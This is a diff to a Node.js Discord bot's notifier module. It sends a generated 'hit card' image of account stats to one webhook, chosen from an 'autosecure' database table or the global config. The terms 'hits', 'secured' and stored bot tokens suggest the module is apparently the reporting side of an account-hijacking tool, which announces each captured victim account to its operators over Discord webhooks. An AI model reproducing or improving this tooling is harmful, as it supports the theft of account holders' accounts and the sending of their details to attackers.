@@ -4,7 +4,6 @@ const config = require('../../../config.json');
 const path = require('path');
 const fs = require('fs');
 const { startFolderMonitor } = require('../autocleaner');
-const { getMainBotClient } = require('../../../mainbot/handlers/botHandler');
 
 const { queryParams } = require('../../../db/database');
 
@@ -24,49 +23,35 @@ async function sendSecureNotification(client, accountData, targetChannelId = nul
             return;
         }
 
-        const notifKey = `${accountData.username.toLowerCase()}_${Math.floor(Date.now() / 15000)}`;
+        // Strict deduplication: 1 hit = 1 notification within 30s window
+        const notifKey = `${accountData.username.toLowerCase()}_${Math.floor(Date.now() / 30000)}`;
         if (recentNotifications.has(notifKey)) {
             console.log(`[NOTIFIER] Skipping duplicate notification for ${accountData.username}`);
             return;
         }
         recentNotifications.add(notifKey);
-        setTimeout(() => recentNotifications.delete(notifKey), 30000);
+        setTimeout(() => recentNotifications.delete(notifKey), 60000);
 
-        let channelId = targetChannelId;
         let customWebhook = null;
-        let botToken = null;
-
-        let notificationChannelId = null;
 
         if (client?.username) {
             try {
-                const dbResults = await queryParams('SELECT hits_channel, notification_channel, webhook, token FROM autosecure WHERE user_id = ? AND botnumber = ? LIMIT 1', [client.username, client.botnumber || 1]);
-                if (dbResults && dbResults[0]?.hits_channel) {
-                    channelId = dbResults[0].hits_channel.split('|')[0];
-                }
-                if (dbResults && dbResults[0]?.notification_channel) {
-                    notificationChannelId = dbResults[0].notification_channel.split('|')[0];
-                }
+                const dbResults = await queryParams('SELECT webhook FROM autosecure WHERE user_id = ? AND botnumber = ? LIMIT 1', [client.username, client.botnumber || 1]);
                 if (dbResults && dbResults[0]?.webhook) {
                     customWebhook = dbResults[0].webhook;
                 }
-                if (dbResults && dbResults[0]?.token) {
-                    botToken = dbResults[0].token;
-                }
             } catch (e) {
-                console.error('[NOTIFIER] Error checking DB for hits_channel & webhook:', e.message);
+                console.error('[NOTIFIER] Error checking DB for webhook:', e.message);
             }
         }
-        if (!channelId) {
-            channelId = config.notifierChannel || config.hitschannel || null;
-        }
 
-        const webhookUrls = new Set();
-        if (customWebhook && customWebhook.trim() !== '') webhookUrls.add(customWebhook.trim());
-        if (config.notifierWebhook && config.notifierWebhook.trim() !== '') webhookUrls.add(config.notifierWebhook.trim());
+        // Priority: custom user webhook -> fallback to global config.notifierWebhook (1 channel = 1 webhook only)
+        const targetWebhook = (customWebhook && customWebhook.trim() !== '')
+            ? customWebhook.trim()
+            : (config.notifierWebhook && config.notifierWebhook.trim() !== '' ? config.notifierWebhook.trim() : null);
 
-        if (webhookUrls.size === 0 && !channelId) {
-            console.log('[NOTIFIER] No notifierWebhook, custom user webhook, or hitschannel configured, skipping image notification.');
+        if (!targetWebhook) {
+            console.log('[NOTIFIER] No webhook configured (customWebhook or config.notifierWebhook), skipping draw hit.');
             return;
         }
 
@@ -98,84 +83,28 @@ async function sendSecureNotification(client, accountData, targetChannelId = nul
             startFolderMonitor(tempDir, 5);
         }
 
-        let imageBuffer = null;
-        let attachment = null;
-        const isChildBot = client && client.botnumber && client.botnumber > 1;
+        const outputPath = path.join(tempDir, filename);
+        const imageBuffer = await makeCard(stats, outputPath);
 
-        if (!isChildBot) {
-            const outputPath = path.join(tempDir, filename);
-            imageBuffer = await makeCard(stats, outputPath);
-            attachment = new AttachmentBuilder(imageBuffer, { name: filename });
-        } else {
-            console.log(`[NOTIFIER] Skipping draw hit for child bot (botnumber: ${client.botnumber})`);
+        if (!imageBuffer) {
+            console.error(`[NOTIFIER] Failed to generate hit card buffer for ${stats.username}`);
+            return;
         }
 
-        // 1. Send via Webhooks if configured
-        if (webhookUrls.size > 0) {
+        const attachment = new AttachmentBuilder(imageBuffer, { name: filename });
 
-            for (const whUrl of webhookUrls) {
-                try {
-                    const webhook = new WebhookClient({ url: whUrl });
-                    const payload = {};
-                    if (attachment) payload.files = [attachment];
-                    else payload.content = `[Hit] **${stats.username}** secured! (Image disabled for child bot)`;
-                    
-                    await webhook.send(payload);
-                    console.log(`[NOTIFIER] Successfully sent hit image to webhook (${whUrl.substring(0, 45)}...) for ${stats.username}`);
-                } catch (whErr) {
-                    console.error('[NOTIFIER] Error sending hit to webhook:', whErr.message);
-                }
-            }
-        }
-
-        // 2. Send to Discord Channel strictly using the MAIN BOT client
-        const channelsToSend = [];
-        if (channelId) channelsToSend.push(channelId);
-        if (notificationChannelId && notificationChannelId !== channelId) channelsToSend.push(notificationChannelId);
-
-        for (const cid of channelsToSend) {
-            try {
-                const mainBotClient = getMainBotClient();
-                let channel = null;
-                let senderTag = 'Unknown';
-
-                // Try all available clients to find the channel
-                const clients = [
-                    mainBotClient,
-                    client
-                ].filter(c => c && c.isReady && c.isReady() && c.channels);
-
-                for (const c of clients) {
-                    channel = await c.channels.fetch(cid).catch(() => null);
-                    if (channel) {
-                        senderTag = c.user?.tag || 'Bot';
-                        break;
-                    }
-                }
-
-                if (channel) {
-                    const payload = {};
-                    if (attachment) payload.files = [attachment];
-                    else payload.content = `[Hit] **${stats.username}** secured! (Image disabled for child bot)`;
-
-                    await channel.send(payload);
-                    console.log(`[NOTIFIER] Successfully sent hit image via ${senderTag} to channel <#${cid}> for ${stats.username}`);
-                } else if (botToken || (config.tokens && config.tokens[0])) {
-                    const { REST, Routes } = require('discord.js');
-                    const rest = new REST({ version: '10' }).setToken(botToken || config.tokens[0]);
-                    const payload = {};
-                    if (imageBuffer) {
-                        payload.files = [{ name: filename, data: imageBuffer }];
-                    } else {
-                        payload.content = `[Hit] **${stats.username}** secured! (Image disabled for child bot)`;
-                    }
-                    await rest.post(Routes.channelMessages(cid), payload);
-                    console.log(`[NOTIFIER] Successfully sent hit image via REST API to channel <#${cid}> for ${stats.username}`);
-                } else {
-                    console.error(`[NOTIFIER] Channel <#${cid}> not found on any bot client`);
-                }
-            } catch (chErr) {
-                console.error(`[NOTIFIER] Error sending hit image to channel ${cid}:`, chErr.message);
+        // Draw hit strictly sends ONLY the image to 1 channel via webhook (1 hit = 1 webhook)
+        try {
+            const webhook = new WebhookClient({ url: targetWebhook });
+            await webhook.send({
+                files: [attachment]
+            });
+            console.log(`[NOTIFIER] Successfully sent hit card image to webhook (${targetWebhook.substring(0, 45)}...) for ${stats.username}`);
+        } catch (whErr) {
+            console.error('[NOTIFIER] Error sending hit image to webhook:', whErr.message);
+        } finally {
+            if (fs.existsSync(outputPath)) {
+                fs.unlink(outputPath, () => {});
             }
         }
 
